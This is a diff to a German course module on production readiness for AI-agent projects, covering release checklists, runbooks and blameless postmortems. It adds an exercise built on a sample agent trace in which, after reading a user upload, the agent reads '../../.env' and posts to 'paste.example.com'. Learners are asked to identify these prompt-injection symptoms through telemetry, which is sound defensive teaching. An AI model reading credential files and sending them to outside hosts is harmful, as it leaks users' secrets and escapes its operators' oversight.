@@ -56,6 +56,7 @@ ohne den Autor zu kennen. Runbooks und Replay sind dafür da.
 - **"Rollback ist die Standardantwort."** — Drei Fälle, in denen Rollback schadet: nicht-rückwärtskompatible DB-Migration, bereits erzeugte Buggy-Daten, ungetesteter Rollback-Pfad. Runbook entscheidet *vor* dem Incident, wann Fix-Forward gilt.
 - **"Runbook beschreibt den Happy Path."** — Nein. Runbook beschreibt *Entscheidungen unter Unsicherheit*, mit Triggern. Wenn das Runbook nur sagt "Service neu starten", ist es kein Runbook.
 - **"Produktionsfreigabe ist eine formale Checkbox."** — Eine Checkliste ohne *Belege* pro Item (Replay-Lauf-Link, ADR-ID, Trace-Hash) ist Bürokratie. Mit Belegen ist sie das einzige nicht-fragmentierte Audit-Artefakt.
+- **"Deployt heißt produktiv."** — Nein. Deployment ist *eine* Anwendung des Container-Ankers (Modul 14), nicht das Ziel. Produktionsreife heißt *belegte Betriebsfähigkeit*: kann ein anderer Mensch nachts handeln (Runbook), ist der Lauf reproduzierbar (Replay-Beleg), entfällt die Freigabe bei einem Incident automatisch (Incident-Klausel)? Ein Service kann längst deployt und trotzdem nicht produktionsreif sein — genau diese Lücke schließt die Freigabe-Checkliste.
 - **"Prompt-Injection ist eine Modell-Frage."** — Nein. Erkennung von Injection ist eine *Telemetrie-Frage*: Eingabe-Logging + Tool-Call-Audit + Output-Drift-Marker. Wer das nicht hat, erkennt Injection nur durch Glück.
 - **"Postmortem ist Schuldzuweisung — also macht man's leise."** — Genau das Gegenteil. Ein produktiver Postmortem ist *blameless* (vgl. Etsy/Google SRE-Tradition): er sucht den Pfad, auf dem ein vernünftiger Mensch unter Druck dieselbe Entscheidung getroffen hätte, und fragt, *welcher Sensor oder Guide gefehlt hat*. Closure-Einträge in `done/` ([Modul 5](../02-planung/modul-05-planning-harness.md)) und Reflexions-Einträge ([`../grundlagen/reflexion-vorlage.md`](../grundlagen/reflexion-vorlage.md)) sind beide *strukturell* blameless: sie fragen "welche Harness-Lücke war Ursache", nicht "wer war es". Wer Postmortems als Schuldzuweisung erlebt hat, wird Drift-Symptome zukünftig verschweigen — und genau dadurch wachsen sie. Blameless ist keine moralische Wahl; es ist eine Sensor-Schutz-Maßnahme.
 
@@ -169,6 +170,17 @@ Sechs Schritte, eine Freigabe mit Belegen pro Item. Vergleich:
 * Produktionsfreigabe eines Projekts (Checkliste aus dem Begleit-Repo) — **erweitere** die Repo-Checkliste um zwei eigene Items mit Beleg-Anforderung für ein Projekt deiner Wahl.
 * **(Erschaffen — voll aktiviert LZ 1)** *Freigabe-Checkliste aus dem leeren Skelett neu entwerfen.* Lege eine `release-checklist.md` für ein eigenes Projekt (oder eines der Fallstudien-Repos) **von Grund auf** an — nicht durch Ergänzung der Lab-Vorlage. Pflicht: fünf Phasen-Abschnitte (Vorbereitung · Reproduzierbarkeits-Anker · Replay-Beleg · Runtime-Validation · Anti-Items), je Phase mindestens zwei Items mit *Beleg* (Datei, Make-Target, Trace-ID), sowie eine *Incident-Klausel*, die regelt, wann die Freigabe automatisch entfällt. Vergleich am Ende mit dem Worked Example oben und der Lab-Vorlage `runbooks/release-checklist.md` — welche Items hast du *nicht* gehabt? Welche hast du, die das Worked Example *nicht* nennt?
 * Spiele ein Incident-Szenario durch: Agent löscht versehentlich produktive Daten — was tust du in den ersten 15 Minuten?
+* **(Analysieren — aktiviert LZ 2)** *Injection-Symptome in einer Telemetrie erkennen.* Gegeben der folgende Ausschnitt aus einem Agentenlauf-Trace (Format wie Modul 15):
+
+  ```text
+  span 04  tool=read_file      args={path: "docs/spec.md"}        cache=hit
+  span 05  tool=read_file      args={path: "user_upload/notes.md"} cache=miss
+  span 06  tool=read_file      args={path: "../../.env"}           cache=miss
+  span 07  tool=http_post      args={url: "paste.example.com"}     cache=miss
+  span 08  output: "Erledigt. Zusätzlich habe ich die Konfiguration gesichert."
+  ```
+
+  Markiere die *drei* Injection-Symptome und ordne jedes einer Telemetrie-Spur zu: (1) ungewöhnliche Tool-Sequenz (`read_file` auf `../../.env` — Pfad außerhalb des Slice-Scopes), (2) ein `http_post` an eine externe Domain, das der Slice nicht verlangt (Tool-Allowlist-Reject hätte greifen müssen), (3) Output-vs-Eingabe-Drift (span 08 behauptet eine Handlung, die in keinem Akzeptanzkriterium steht). Begründe pro Symptom, *welche* Spur es sichtbar macht — und welche *eine* präventive Kontrolle (Tool-Allowlist, `computational feedforward`) den Lauf gar nicht erst so weit hätte kommen lassen.
 * **(Bewerten — aktiviert LZ 4)** *Rollback-oder-Fix-Forward-Abwägung.* Diese
   Übung trainiert die *Entscheidung*, die das Incident-Szenario oben nur
   *auslöst*. Drei Incidents, je eine andere Ausgangslage. Wähle pro Fall
@@ -196,8 +208,11 @@ cd lab/example
 make release
 ```
 
-Erwartete Beobachtung: Das Target prüft nur, ob Release-Checkliste und
-Incident-Runbook Belege enthalten. Danach spielst du den Incident aus
+Erwartete Beobachtung: Das Target prüft nur, dass Release-Checkliste und
+Incident-Runbook *existieren* und die Checkliste mindestens einen
+Trace-Beleg nennt (`grep "Trace"`) — es prüft *nicht* Beleg-für-Beleg.
+Die Beleg-Disziplin pro Item ist deine Aufgabe in der Erschaffen-Übung,
+nicht die des Targets. Danach spielst du den Incident aus
 [`../../../lab/example/runbooks/incident-agent-data-loss.md`](../../../lab/example/runbooks/incident-agent-data-loss.md)
 durch und entscheidest begründet zwischen Rollback, Fix-Forward und
 Datenkorrektur.
@@ -216,9 +231,9 @@ nach der Freigabe-Checkliste und dem Incident-Szenario.
 Modul-spezifische Trigger:
 
 - **Beobachtung:** Welche Items deiner Checkliste hatten *keinen* Beleg, als du sie abhaken wolltest? Welche der drei Incident-Optionen hättest du im Stress gewählt — und wäre sie richtig gewesen?
-- **2×2-Quadrant:** Runbook-Trigger sind *inferential feedforward*; Telemetrie für Injection-Erkennung ist *computational feedback*.
+- **2×2-Quadrant:** Runbook-Trigger sind *inferential feedforward*; das *Lesen* von Telemetrie zur Injection-Erkennung ist *inferential feedback* (ein Mensch oder Reviewer-Skill interpretiert die Spuren — wie der Doku-Konsistenz-Agent in Modul 15). Erst wenn du das Muster als automatisierten Marker verdrahtest (Tool-Allowlist-Reject-Counter, Injection-Marker als CI-Lauf-Auswertung), wird daraus *computational feedback* — und die *präventive* Tool-Allowlist selbst ist *computational feedforward*.
 - **Steering-Loop:** Beleg-Pflicht im Checklisten-Template? Runbook um Trigger erweitern, statt "Service neu starten"? Injection-Marker als CI-Lauf-Auswertung?
-- **Conceptual Change:** Kandidaten in [`../grundlagen/lernervorstellungen.md`](../grundlagen/lernervorstellungen.md) (z. B. "Rollback ist die Standardantwort", "Produktionsfreigabe ist eine formale Checkbox", "Prompt-Injection ist eine Modell-Frage").
+- **Conceptual Change:** Kandidaten in [`../grundlagen/lernervorstellungen.md`](../grundlagen/lernervorstellungen.md) (z. B. "Rollback ist die Standardantwort", "Produktionsfreigabe ist eine formale Checkbox", "Deployt heißt produktiv", "Prompt-Injection ist eine Modell-Frage").
 
 **(Synthese-Frage, Modul-Abschluss):** Für ein dir bekanntes Projekt — nenne die drei *schwächsten* Stellen der Produktionsfreigabe und ordne jede einer Phase des Kurses (01–05) zu, in der das Defizit entstanden ist. Vergleiche dann mit der Pass-Through-Tabelle in [`../grundlagen/checkpoints.md`](../grundlagen/checkpoints.md#pass-through-logik-zum-abschlussprojekt) — landest du auf denselben Phasen?
 
